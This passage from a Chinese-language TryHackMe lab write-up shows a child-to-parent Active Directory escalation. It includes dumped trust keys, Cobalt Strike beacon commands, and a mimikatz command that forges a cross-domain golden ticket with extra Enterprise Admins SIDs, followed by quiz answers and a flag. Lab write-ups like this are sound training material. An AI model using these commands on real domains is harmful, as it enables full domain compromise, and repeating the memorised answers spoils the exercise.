    * 2022/08/17 02:14:53 - CLEAR   - 8f 2b 99 46 bb 18 93 c3 f4 40 b7 64 13 77 e1 6c dd a3 b1 02 b1 2a 71 4a d2 ad ad 9c 97 ba e9 d2 e4 cd 2e e9 53 0e 8c 7d e2 3c 4e 54 d8 b1 d5 9b 93 73 77 b1 d5 fd 4a fb 1a fc b9 8b 5c 48 26 91 99 2c b3 97 43 14 cd 87 06 59 44 dc d7 82 14 f5 9a 6f 40 97 e5 e3 e9 b2 72 74 cb 1e f7 37 4b 09 90 2e 3e e5 3a 81 a3 5a 4b 0d 41 1f 75 fb 4f 9c 1e fc fa 59 26 85 5d 6d 00 08 37 81 2a 60 88 0a 1b cb 72 82 a3 76 36 53 9d c6 b2 fd d0 2d 1d 3d 7f 86 21 8d d4 b1 c4 da ae 9a 31 4e 77 44 ac 60 ab 42 d0 a8 06 0a 1b ae af 35 d2 a3 8e b1 7b cd e0 8d 13 da a0 5a ec 0b e2 3e 48 84 34 48 46 00 9f f4 ae 58 93 64 0a 7a 16 0d b9 d0 ae 84 d8 ef a6 9a 45 9b 52 7d 06 b6 86 59 d8 15 9b ce 58 6b 8e bd 37 81 91 60 59 ef 97 5a d2 95 5b 1a 76 b2 
  * aes256_hmac       54588854cbc470608ec18a9256ecb32e95701e93314fe0d14312928e171be787
  * aes128_hmac       c246bee129b482cbb16772a9efdff87d
  * rc4_hmac_nt       22159b7318a4ab55849fd116ae40d817

 [ Out ] TRYHACKME.LOC -> ZA.TRYHACKME.LOC
    * 2022/08/17 02:14:27 - CLEAR   - 4b eb 0c 65 64 92 e1 4f e7 93 18 f0 f0 32 01 14 5e 84 a3 50 6e 93 e3 97 db 7f f7 24 d1 5e d9 b0 db 6c 1d 29 c7 6f d1 69 33 97 91 09 65 fd a5 32 f6 55 63 d9 c6 4f f6 71 3a f1 97 12 d0 9e b4 68 6b 04 dd e2 32 a5 34 87 96 30 6c ef ae 44 2e 45 f8 9e 67 89 56 4a 62 08 dc a9 88 9e 60 8a c3 79 00 dd b2 dc a6 0f aa 25 dd 9f 44 de 73 19 f1 88 22 ee f5 00 8e 0a de 95 8c 6a 5e d3 ab d3 0c 53 48 73 f8 dd ef 36 90 76 62 cd fb 16 c4 f0 17 4c bc f5 de 7f 2e ee a6 09 00 4b 23 b5 45 26 9f 7b 5d de 0e c9 f7 0b 99 7a f3 05 59 ac 5d 4d e1 1f c2 66 2d 6e 48 ea 7f 17 29 33 8d 79 36 9c c4 38 6e 40 46 5b 9f 4e 0e 44 b8 37 01 36 b7 a4 67 7a 21 22 70 58 9c 63 10 71 19 c2 8c 09 fc e1 12 05 8e 65 80 c5 39 4a 60 26 17 a9 91 86 68 87 6a 7e 
  * aes256_hmac       bb3e911c27355aed7411cc195f8c2a17e0c0b41c21ffca96a78fc0a051cc80c7
  * aes128_hmac       d2068648b914557c9294def998139a03
  * rc4_hmac_nt       6f3604b0b2d8150e192e0cfbada47041

 [ In-1] ZA.TRYHACKME.LOC -> TRYHACKME.LOC
    * 2022/05/26 18:58:41 - CLEAR   - f7 fd c8 6f 3f 40 60 8d cf b9 78 7b ff dd 93 79 c0 80 96 45 f1 f3 cc 1a eb 52 61 cb cc ce 1d 52 dc 9c 68 f3 12 a2 6a 2f f7 3e 48 52 34 9d 2b 58 56 9e c8 d1 95 02 2e b4 ac 62 c9 b4 12 40 9f df 08 ea e0 9d 2f d8 db 53 6b 62 42 cf 3c 59 70 21 f7 cd 23 3c 22 a1 36 f5 6e e8 80 d1 fb 7f 24 30 ef 38 59 0f 71 8a cb fe 34 c3 5e 27 b1 54 1f 9c 00 11 04 e0 c0 71 40 36 99 af 09 de 65 d8 3b 3d 12 c2 09 2c 35 29 44 aa cd db 0a de 6d a1 e9 1b 5b 65 bf 4a 7c 26 f6 85 b6 d4 d3 c3 e5 5c 8e f8 9d 19 e3 66 d1 6e 93 e2 3a f3 4d 46 30 19 a1 3c 15 de d8 60 5b 53 88 47 46 1d 48 65 aa a7 90 bb 86 70 99 47 a3 99 9f 13 d1 06 5e 4a 8f 7b 11 4a ba d5 bc b0 a9 e3 4f f1 89 61 8d 2c 63 78 e0 21 5b dc 6e 3e ef 0e 00 65 9c 53 ca 5b 28 12 48 29 
  * aes256_hmac       ea1158dc37576415dc1b1c12e13b3dc450994c7abed710c3785a707fd9285a42
  * aes128_hmac       41ce2a749c37997db2958fbc31e5c9c6
  * rc4_hmac_nt       f92cee9036cb4aaf877830eb7e402961

 [Out-1] TRYHACKME.LOC -> ZA.TRYHACKME.LOC
    * 2022/08/17 02:14:27 - CLEAR   - d2 c7 2b ea 27 1d 3d 4c eb 54 9d 68 e6 7f a2 f8 02 b2 0f 4d be 2e e6 ac d8 7b f3 f0 8d ab cb 81 3d 07 23 a6 b2 57 04 13 c1 50 86 99 98 19 3d 66 07 8e 8c 6a 66 47 d6 75 9d f5 01 d1 63 23 12 66 b7 d5 a7 74 aa 1c a5 06 1e 58 d1 81 65 7e cb b3 bf fe 00 8a a1 b9 cb 78 8f 60 c2 9b fb 36 1b d9 3b 75 a3 1c 03 aa 45 02 8b ef 06 78 b7 eb a2 9c 59 bd 21 ab b1 34 54 78 c0 8d df 00 70 2a f7 2a 80 d1 3c e6 ee 40 41 90 2a eb cd ab a3 b7 61 b4 a1 5e 57 f1 fe a2 34 29 27 7a 87 c2 c5 91 13 bc 96 77 d5 7b 7a fa 5b 3d 3a 46 16 3c 1e 35 b6 90 80 29 6c d3 3e f5 c7 21 79 82 3d 0b 06 56 d2 04 3d 4d 79 31 e5 e1 12 74 f8 d8 3c b6 06 b1 ef de f6 53 b5 cd 23 f8 d3 e2 87 e2 9b 4f 16 b2 68 90 1f 8f 53 04 e0 c0 76 5f 51 98 aa ab 47 b8 3a 77 
  * aes256_hmac       54601b72bdd07f656cfbea046f6ddfa9caf15c602a797f296aeeefe7c1a1d994
  * aes128_hmac       2e0a6834f4bc75bdcaa05b08a3933963
  * rc4_hmac_nt       9baba00f42812f1e9f5250a58d67f8f5
```


枚举Enterprise Admins的信息，这一步主要是拿到Enterprise Admins的SID
```
beacon> powershell Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
[*] Tasked beacon to run: Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
[+] host called home, sent: 259 bytes
[+] received output:
#< CLIXML

DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-519

```


使用krbtgt账号制作一张跨域的金票
```
beacon> mimikatz kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt

[*] Tasked beacon to run mimikatz's kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt command
[+] host called home, sent: 750706 bytes
[+] received output:
User      : Administrator
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185-1001
User Id   : 500
Groups Id : *513 512 520 518 519 
Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ; 
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt      
Service   : krbtgt
Lifetime  : 2022/08/17 10:29:56 ; 2032/08/14 10:29:56 ; 2032/08/14 10:29:56
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session
```


访问父域DC
```
beacon> ls \\thmrootdc.tryhackme.loc\c$
[*] Tasked beacon to list files in \\thmrootdc.tryhackme.loc\c$
[+] host called home, sent: 46 bytes
[*] Listing: \\thmrootdc.tryhackme.loc\c$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/21/2020 20:25:38   $Recycle.Bin
          dir     03/21/2020 20:49:34   Boot
          dir     03/21/2020 20:25:04   Documents and Settings
          dir     09/15/2018 08:19:00   PerfLogs
          dir     03/21/2020 20:31:12   Program Files
          dir     03/21/2020 20:28:23   Program Files (x86)
          dir     05/01/2022 16:41:18   ProgramData
          dir     03/21/2020 20:25:09   Recovery
          dir     04/25/2022 17:52:55   System Volume Information
          dir     04/25/2022 17:50:08   tmp
          dir     04/27/2022 07:54:59   Users
          dir     04/25/2022 17:50:06   vagrant
          dir     04/27/2022 18:29:41   Windows
 399kb    fil     03/21/2020 20:38:26   bootmgr
 1b       fil     09/15/2018 08:12:30   BOOTNXT
 8kb      fil     03/22/2020 04:23:43   BOOTSECT.BAK
 103b     fil     01/04/2022 07:47:26   delete-vagrant-user.ps1
 384mb    fil     08/17/2022 09:30:31   pagefile.sys
 31b      fil     05/01/2022 08:42:19   root_dns_entries.csv
 1kb      fil     05/01/2022 09:07:14   thm-network-setup-dc.ps1
```

> What domain trust relationship is by default configured between a parent and a child domain?

> Bidirectional trust

> What is the name of the AD account used by the KDC to encrypt and sign TGTs?

> krbtgt

> What is the name of the TGT that grants access to resources outside of our current domain?

> Inter-Realm TGT

> What is the value of the flag stored on THMROOTDC in the Administrator's Desktop folder (flag6.txt)?

> THM{Full.EA.Compromise}